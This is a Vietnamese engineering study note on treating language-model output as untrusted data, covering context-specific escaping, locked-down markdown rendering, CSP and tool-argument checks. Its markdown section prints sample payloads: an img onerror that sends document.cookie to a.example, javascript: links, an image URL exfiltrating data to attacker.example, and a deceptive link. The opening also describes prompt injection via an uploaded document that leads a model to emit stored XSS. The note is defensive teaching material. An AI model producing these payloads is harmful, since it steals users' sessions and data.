---
level: intermediate
area: ai-engineering
prerequisites:
  - 01-prompt-injection.md
related:
  - ../01-context-and-output/03-structured-output.md
  - ../../05-cross-cutting/security/03-xss-csrf.md
---

# Output của model là dữ liệu không đáng tin

> Một sản phẩm cho phép người dùng hỏi về tài liệu của họ, và render câu trả lời bằng markdown để hiển thị bảng và danh sách đẹp. Một người dùng upload tài liệu chứa hướng dẫn nhắm vào model. Model xuất ra một thẻ `<img>` với `onerror` chạy JavaScript. Markdown renderer cho phép HTML thô. **Stored XSS** — và nó chạy trong phiên của mọi người mở lại hội thoại đó, kể cả nhân viên hỗ trợ.

## Position

```text
Model output (text)
      │
      ▼  ← NOTE NÀY: mỗi ĐÍCH ĐẾN cần một cách xử lý khác
HTML · SQL · shell · file path · URL · tool arg · redirect · DB
```

## Problem

Có một chuỗi suy luận mà mọi developer cần đi qua một lần:

```text
① Người dùng ảnh hưởng được input của model
② Output của model phụ thuộc input
⇒ Output của model là DỮ LIỆU CHỊU ẢNH HƯỞNG CỦA NGƯỜI DÙNG
⇒ Nó phải được xử lý y như body của một HTTP request từ Internet
```

Nhưng trực giác mặc định làm điều ngược lại: output đến từ *"API của chúng ta gọi"*, nó trông sạch sẽ, nó tiếng Việt lịch sự — nên nó *cảm giác* đáng tin. Cảm giác đó là toàn bộ lỗ hổng.

> **Không có gì trong output của LLM đảm bảo nó an toàn cho bất kỳ đích đến nào.**

Và khác biệt so với input người dùng thường: **người ta đã có phản xạ với input người dùng.** Không ai đưa `req.body.name` thẳng vào `innerHTML`. Nhưng rất nhiều người đưa `answer` thẳng vào `dangerouslySetInnerHTML`.

## Mental Model

### Escape theo NGỮ CẢNH, không phải "làm sạch" một lần

Đây là nguyên tắc trung tâm, và nó không mới — nó là nguyên tắc của [03-xss-csrf.md](../../05-cross-cutting/security/03-xss-csrf.md) áp dụng cho một nguồn dữ liệu mới:

```text
Không có "sanitize" chung. Mỗi ĐÍCH ĐẾN có một cách xử lý riêng:

ĐÍCH ĐẾN            RỦI RO                   BIỆN PHÁP
─────────────────────────────────────────────────────────────────────
HTML (render)       XSS                      escape, hoặc sanitize allowlist
Markdown → HTML     XSS qua HTML thô/link    tắt HTML thô + allowlist tag/host
Thuộc tính HTML     XSS                      escape theo attribute
JavaScript          thực thi code            KHÔNG BAO GIỜ. Không eval.
SQL                 SQL injection            tham số hoá — luôn luôn
Shell               command injection        không dùng shell; hoặc execFile + args
Đường dẫn file      path traversal           resolve + kiểm nằm trong thư mục cho phép
URL (fetch)         SSRF                     allowlist domain + kiểm IP sau resolve
URL (redirect)      open redirect            chỉ path nội bộ, hoặc allowlist
Tool argument       vượt quyền, hành động sai schema + authz + policy
Ghi vào DB          stored XSS về sau        escape lúc ĐỌC RA, không chỉ lúc ghi
Tên file tải về     header injection         sinh tên ở server, không dùng tên model đề xuất
Log                 log injection            escape newline, hoặc log có cấu trúc
```

Dòng "Ghi vào DB" là dòng gây sự cố ở đầu note. Escape lúc ghi là chưa đủ và thường sai; **escape đúng phải xảy ra ở nơi dữ liệu được dùng**, vì cùng một chuỗi cần escape khác nhau cho HTML, cho attribute, cho URL.

### Markdown là bề mặt tấn công lớn nhất, vì nó bị coi là an toàn

Gần như mọi chatbot render markdown. Đó là chỗ dễ sai nhất:

```text
Bốn đường tấn công qua markdown:

① HTML THÔ được cho phép
   <img src=x onerror="fetch('https://a.example?c='+document.cookie)">
   → nhiều renderer cho phép HTML mặc định  ← SỰ CỐ ĐẦU NOTE

② URL scheme nguy hiểm
   [click](javascript:alert(1))
   [click](data:text/html;base64,...)

③ ẢNH tới domain lạ — EXFILTRATION không cần click
   ![](https://attacker.example/x.png?d=<dữ liệu>)

④ LINK lừa đảo
   [https://mycompany.com/login](https://attacker.example/login)
   → text hiển thị khác href
```

Đường ③ là đường tinh vi nhất: **không cần người dùng làm gì**, browser tự tải ảnh.

Cấu hình đúng:

```ts
const html = renderMarkdown(answer, {
  allowRawHtml: false,                    // ← mặc định của nhiều lib là TRUE
  allowedTags: ['p','br','strong','em','code','pre','ul','ol','li',
                'table','thead','tbody','tr','th','td','blockquote',
                'h1','h2','h3','a','img'],
  allowedSchemes: ['http', 'https', 'mailto'],   // KHÔNG javascript:, data:
  transformImage: (src) =>
    ALLOWED_IMAGE_HOSTS.has(safeHost(src) ?? '') ? src : null,
  transformLink: (href) => {
    const host = safeHost(href);
    if (!host) return null;
    if (!ALLOWED_LINK_HOSTS.has(host)) {
      // Hiện link nhưng KHÔNG cho click tự động, và hiện host thật
      return { href: '#', title: `Liên kết ngoài bị chặn: ${host}` };
    }
    return { href, rel: 'noopener noreferrer', target: '_blank' };
  },
});
```

Ba dòng quan trọng nhất: `allowRawHtml: false`, allowlist scheme, và **allowlist host cho ảnh**.

Và một lớp phòng thủ thứ hai, độc lập với renderer: **CSP**.

```text
Content-Security-Policy:
  default-src 'self';
  img-src 'self' cdn.mycompany.com;      ← chặn ảnh tới domain lạ
  script-src 'self';                      ← chặn inline script
  connect-src 'self' api.mycompany.com;
```

CSP chặn được cả những đường bạn chưa nghĩ tới. Xem [07-csp-browser-security.md](../../01-web-frontend/00-web-foundations/07-csp-browser-security.md).

### Ba đích đến mà câu trả lời luôn là "không"

```text
❌ eval(modelOutput) / new Function(modelOutput)
❌ exec(`bash -c "${modelOutput}"`)
❌ prisma.$queryRawUnsafe(modelOutput)
```

Không có phiên bản an toàn của ba dòng đó. Nếu bạn cần model tạo ra hành động, cho nó **tool có schema** — đó là toàn bộ lý do tool calling tồn tại. Xem [01-tool-calling.md](../04-agents-tools/01-tool-calling.md).

Nếu buộc phải thực thi code do model sinh (ví dụ tính toán dữ liệu), nó phải chạy trong **sandbox thật**: process riêng, không mạng, không filesystem, giới hạn CPU/RAM, timeout. Đó là một hệ thống, không phải một hàm.

### Tool argument: đích đến bị bỏ qua nhiều nhất

Người ta nghĩ về XSS và SQL, và quên rằng `toolCall.args` cũng là output của model:

```ts
// args đi vào một truy vấn → cùng rủi ro như mọi input khác
const parsed = Args.safeParse(call.args);          // ① schema
if (!parsed.success) return toolError(...);

const order = await orders.findOne({
  id: parsed.data.orderId,
  userId: ctx.userId,                              // ② định danh từ SESSION
});
if (!order) return toolError(call.id, 'NOT_FOUND'); // ③ authz trên object
```

Chi tiết ở [02-tool-security.md](../04-agents-tools/02-tool-security.md).

### Ba đích đến ít ai nghĩ tới

**① Tên file khi cho tải về**

```text
❌ Content-Disposition: attachment; filename="${modelSuggestedName}"
   → model có thể chèn newline → HEADER INJECTION
   → hoặc "../../etc/passwd", hoặc ".html" → XSS khi mở

✅ tên sinh ở server; phần model đề xuất chỉ dùng làm nhãn hiển thị,
   đã lọc còn [a-zA-Z0-9._-] và có đuôi do server quyết định
```

**② Log**

```text
❌ logger.info(`answer: ${answer}`)
   → newline trong answer tạo ra dòng log giả → gây nhiễu điều tra

✅ log có cấu trúc: logger.info('answer', { answer })
   → thư viện tự escape; và cân nhắc KHÔNG log nội dung
```

**③ Redirect / URL hiển thị**

```text
❌ res.redirect(modelOutput.nextUrl)               → open redirect
✅ chỉ nhận path nội bộ đã allowlist, hoặc bỏ hẳn tính năng này
```

### Một tầng nữa: output "hợp lệ" nhưng SAI về nghiệp vụ

Đây là rủi ro không phải bảo mật nhưng cùng gốc — output đúng hình dạng không nghĩa là đúng:

```text
Model trả về: { orderId: "550e8400-...", refundAmount: 50000000 }

Schema: PASS. UUID hợp lệ, số nguyên hợp lệ.
Thực tế: đơn đó thuộc người khác, và giá trị đơn là 200.000đ.
```

Nên sau schema validation luôn còn một tầng nữa:

```text
① Schema      hình dạng   ← đảm bảo được
② Ngữ nghĩa   id tồn tại? thuộc user này? trạng thái cho phép?
③ Policy      trong hạn mức? cần xác nhận?
```

## Example

Một hàng rào đầy ra cho câu trả lời chatbot:

```ts
async function deliverAnswer(raw: string, ctx: Ctx): Promise<AnswerDto> {
  // ① không log nội dung thô; chỉ log độ dài + hash để đối chiếu
  logger.info('answer.produced', { requestId: ctx.requestId, length: raw.length });

  // ② verify citation — chỉ id thuộc context này
  const { text, citations, hallucinated } = verifyCitations(raw, ctx.docIds);
  if (hallucinated.length) metrics.increment('ai.hallucinated_citation');

  // ③ render markdown an toàn, chặn kênh ra ngoài
  const { html, blocked } = sanitizeMarkdown(text);
  if (blocked.length) metrics.increment('ai.blocked_outbound', { n: blocked.length });

  // ④ FE nhận HTML ĐÃ sanitize + citation ĐÃ verify.
  //    Không trả raw để FE tự render.
  return { html, citations, hasBlockedContent: blocked.length > 0 };
}
```

Quyết định ④ là quyết định kiến trúc: **sanitize ở server, không để mỗi client tự làm.** Nếu bạn trả markdown thô và mong frontend xử lý đúng, thì mỗi client (web, mobile, tiện ích, tích hợp của đối tác) là một cơ hội làm sai.

Và `hasBlockedContent` cho UI hiện được một thông báo trung thực: *"Câu trả lời có chứa liên kết bên ngoài đã bị chặn."*

## Prediction

1. Bạn render markdown với cấu hình mặc định của thư viện. Rủi ro?
2. Model xuất `![](https://x.example/p.png?d=BASE64)`. Bạn cho phép mọi ảnh. Chuyện gì xảy ra?
3. Bạn escape khi GHI vào database. Sáu tháng sau đọc ra render. An toàn chưa?
4. Bạn dùng `Content-Disposition: filename="${modelName}"`. Model trả tên có newline. Kết quả?
5. Schema validate pass: `{ orderId: <uuid hợp lệ>, amount: 50000000 }`. Có được thực thi chưa?
6. Bạn trả markdown thô cho frontend và mong nó sanitize. Rủi ro?

<details>
<summary>Đáp án</summary>

1. Nhiều thư viện markdown **cho phép HTML thô mặc định** → `<img onerror>` chạy được → XSS. Phải tắt tường minh và dùng allowlist.
2. Browser của người dùng **tự tải ảnh**, gửi dữ liệu trong query tới attacker. Không cần click, không có dấu hiệu. Đây là exfiltration.
3. **Chưa.** Escape đúng phụ thuộc **đích đến**: HTML, attribute, URL cần escape khác nhau. Escape lúc ghi cũng làm dữ liệu trong DB bị biến dạng. Escape lúc dùng.
4. **Header injection** — newline tách header, có thể chèn header khác. Sinh tên ở server.
5. **Chưa.** Schema chỉ đảm bảo hình dạng. Còn phải kiểm: đơn tồn tại, thuộc user này, số tiền lấy từ đơn (không từ model), trạng thái cho phép, trong hạn mức.
6. Mỗi client là một cơ hội sai — và client bạn không viết (tích hợp của đối tác) chắc chắn sẽ sai. Sanitize ở server.

</details>

## Failure Modes

| Triệu chứng | Nguyên nhân |
|---|---|
| XSS trong câu trả lời chatbot | markdown cho phép HTML thô |
| Stored XSS ảnh hưởng cả nhân viên | escape lúc ghi thay vì lúc đọc |
| Dữ liệu ra ngoài, không rõ kênh | ảnh markdown không allowlist host |
| Người dùng bị dẫn tới site lừa đảo | link text khác href, không allowlist |
| Header lạ trong response tải file | tên file từ model, chứa newline |
| Log bị nhiễu, khó điều tra | log nội dung thô, không escape newline |
| Model gây hành động sai object | thiếu tầng kiểm ngữ nghĩa sau schema |
| Redirect tới domain ngoài | dùng URL từ output làm redirect |
| Một client render an toàn, client khác không | sanitize ở client thay vì server |

## Debugging

```text
1. Liệt kê MỌI đích đến mà output của model đi tới
   → HTML? URL? tên file? log? tool arg? DB? redirect?
2. Với mỗi đích: có escape/validate ĐÚNG NGỮ CẢNH đó chưa?
3. Cấu hình markdown: allowRawHtml? allowedSchemes? allowlist host?
4. Có CSP không? img-src và script-src ra sao?
5. Có eval / exec / queryRawUnsafe nào nhận output của model?
6. Sanitize ở server hay ở client?
```

Bước 1 là bước quyết định và nên làm thành một danh sách trong tài liệu kiến trúc — không phải trong đầu.

## Trade-offs

| Quyết định | Được | Mất |
|---|---|---|
| Chỉ render plain text | an toàn nhất | mất bảng, danh sách, code block |
| Markdown + allowlist chặt | đẹp và an toàn | phải cấu hình đúng; chặn một số nội dung hợp lệ |
| Cho phép HTML thô | linh hoạt nhất | **XSS** — gần như không bao giờ đáng |
| Sanitize ở server | một chỗ đúng cho mọi client | server phải biết định dạng đích |
| Sanitize ở client | linh hoạt cho từng UI | mỗi client là một cơ hội sai |
| Allowlist host cho ảnh/link | chặn exfiltration và lừa đảo | phải cập nhật; chặn ảnh hợp lệ |
| CSP chặt | chặn cả đường chưa nghĩ tới | có thể chặn tính năng; cần thử nghiệm |

## Explain Without Notes

1. Người dùng ảnh hưởng input → output là **dữ liệu chịu ảnh hưởng của người dùng**.
2. Không có "sanitize" chung — escape theo **đích đến**.
3. Markdown là bề mặt lớn nhất: tắt HTML thô, allowlist scheme, **allowlist host cho ảnh**.
4. Ba đích đến luôn "không": `eval`, shell, raw SQL. Cần hành động thì dùng tool có schema.
5. Sau schema còn hai tầng: ngữ nghĩa và policy. Và sanitize ở **server**.

## Related

- [Prompt injection](./01-prompt-injection.md) — vì sao output chịu ảnh hưởng của người khác
- [Structured output](../01-context-and-output/03-structured-output.md) — parse, validate, normalize
- [Tool calling](../04-agents-tools/01-tool-calling.md) — cách đúng để model gây hành động
- [Tool security](../04-agents-tools/02-tool-security.md) — `args` là output của model
- [XSS & CSRF](../../05-cross-cutting/security/03-xss-csrf.md) — escape theo ngữ cảnh
- [CSP & browser security](../../01-web-frontend/00-web-foundations/07-csp-browser-security.md) — lớp phòng thủ thứ hai
- [Injection](../../05-cross-cutting/security/02-injection.md) — SQL, command
- [SSRF & supply chain](../../05-cross-cutting/security/05-ssrf-supply-chain.md) — URL từ output
- [Upload & download file](../../02-backend-api/00-http-api/09-file-upload-download.md) — tên file, Content-Disposition
- [Structured logging](../../05-cross-cutting/observability/02-structured-logging.md) — log injection
